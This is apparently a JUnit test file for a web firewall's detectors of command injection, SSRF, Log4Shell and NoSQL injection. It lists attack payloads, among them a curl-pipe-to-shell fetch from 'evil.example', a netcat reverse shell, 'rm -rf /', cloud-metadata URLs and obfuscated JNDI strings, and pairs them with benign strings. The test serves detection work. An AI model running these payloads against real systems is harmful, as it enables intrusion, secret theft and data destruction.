package com.securegate.filter.detector;

import com.securegate.model.AttackType;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

class NewDetectorsTest {

    private final CommandInjectionDetector cmd = new CommandInjectionDetector();
    private final SsrfDetector ssrf = new SsrfDetector();
    private final Log4ShellDetector log4 = new Log4ShellDetector();
    private final NoSqlInjectionDetector nosql = new NoSqlInjectionDetector();

    // ---------------------------------------------------------------- command injection

    @ParameterizedTest
    @ValueSource(strings = {
            "; cat /etc/passwd", "file.txt; whoami", "x | uname -a", "a && /bin/sh", "$(whoami)", "`whoami`",
            "; rm -rf /", "; ls -la", "name; id", "; curl http://evil.example/x.sh | sh", "cat${IFS}/etc/hosts",
            "%3Bwhoami", "%253B%2520whoami", "1; sleep 10", "| powershell -enc AAAA", "& ipconfig /all",
            "x\nwhoami", "bash -c 'id'", "python3 -c 'import os'", "nc -e /bin/sh 10.0.0.1 4444"})
    void commandInjectionDetected(String payload) {
        assertThat(cmd.detect(payload)).as(payload).isTrue();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "Great product; I would buy it again", "pros | cons", "Tom && Jerry", "cat food and dog food",
            "ls is a unix command", "I'd say id like more", "uname=bob&id=5&sort=asc", "whoami=me",
            "see you; id love to meet", "This works great; curl up with a book", "100% | 50%", "a & b",
            "price is $(5) not $10", "Use `ls` to list files", "path: /usr/local", "Hello; world"})
    void commandInjectionAllowsNormalText(String text) {
        assertThat(cmd.detect(text)).as(text).isFalse();
    }

    // ---------------------------------------------------------------- SSRF

    @ParameterizedTest
    @ValueSource(strings = {
            "http://169.254.169.254/latest/meta-data/", "http://localhost:8080/admin", "http://127.0.0.1/",
            "http://[::1]/x", "http://0.0.0.0:22", "http://10.1.2.3/", "http://192.168.0.1/", "http://172.20.0.5/",
            "http://2130706433/", "http://0x7f000001/", "http://0177.0.0.1/", "http://evil.com@127.0.0.1/",
            "http://metadata.google.internal/computeMetadata/v1/", "http://db.internal/", "gopher://127.0.0.1:6379/_x",
            "dict://localhost:11211/", "https://LOCALHOST/", "%68ttp%3A%2F%2F127.0.0.1%2F",
            "http%3A%2F%2F169.254.169.254%2F"})
    void ssrfDetected(String payload) {
        assertThat(ssrf.detect(payload)).as(payload).isTrue();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "https://example.com/page", "https://www.google.com/search?q=localhost", "my router is 192.168.1.1",
            "I run it on localhost", "http://172.15.0.1/", "http://172.32.0.1/", "http://11.0.0.1/",
            "visit http://10.example.com/", "https://api.github.com/users/x", "ftp://ftp.debian.org/debian"})
    void ssrfAllowsPublicUrlsAndPlainText(String text) {
        assertThat(ssrf.detect(text)).as(text).isFalse();
    }

    @Test
    void ssrfIgnoresHeadersBecauseBrowsersSendLocalOrigins() {
        assertThat(ssrf.appliesToHeaders()).isFalse();
        assertThat(new SqlInjectionDetector().appliesToHeaders()).isTrue();
        assertThat(log4.appliesToHeaders()).isTrue();
    }

    // ---------------------------------------------------------------- Log4Shell

    @ParameterizedTest
    @ValueSource(strings = {
            "${jndi:ldap://evil.example/a}", "${jndi:rmi://evil.example/a}", "${JNDI:LDAP://EVIL/a}",
            "${${lower:j}ndi:ldap://x/a}", "${${::-j}${::-n}${::-d}${::-i}:ldap://x/a}",
            "${${env:NaN:-j}ndi${env:NaN:-:}ldap://x/a}", "${env:AWS_SECRET_ACCESS_KEY}", "${sys:user.name}",
            "%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D", "%2524%257Bjndi%253Aldap"})
    void log4ShellDetected(String payload) {
        assertThat(log4.detect(payload)).as(payload).isTrue();
    }

    @ParameterizedTest
    @ValueSource(strings = {"Hello ${name}", "Cost: $5 or ${price}", "price in {USD}", "a $ b { c }", "jndi is a Java API"})
    void log4ShellAllowsPlainTemplatesAndText(String text) {
        assertThat(log4.detect(text)).as(text).isFalse();
    }

    // ---------------------------------------------------------------- NoSQL

    @ParameterizedTest
    @ValueSource(strings = {
            "$ne", "$gt", " $regex ", "{\"$ne\": null}", "{'$gt': ''}", "user[$ne]=x", "password[$regex]=.*",
            "{\"$where\": \"sleep(5000)\"}", "$where: 'this.a == 1'", "' || '1'=='1", "db.users.find({})",
            "'; return true; var x='", "%7B%22%24ne%22%3Anull%7D", "username[%24exists]=true"})
    void noSqlInjectionDetected(String payload) {
        assertThat(nosql.detect(payload)).as(payload).isTrue();
    }

    @ParameterizedTest
    @ValueSource(strings = {"$5", "$50.00", "costs $ne5", "price: $in USD", "the db is fast", "He said 'ok'; return to base",
            "{\"name\": \"bob\"}", "array[0]", "a[b]=c", "$100 off"})
    void noSqlAllowsNormalText(String text) {
        assertThat(nosql.detect(text)).as(text).isFalse();
    }

    @Test
    void reportTypes() {
        assertThat(cmd.type()).isEqualTo(AttackType.COMMAND_INJECTION);
        assertThat(ssrf.type()).isEqualTo(AttackType.SSRF);
        assertThat(log4.type()).isEqualTo(AttackType.LOG4SHELL);
        assertThat(nosql.type()).isEqualTo(AttackType.NOSQLI);
    }
}
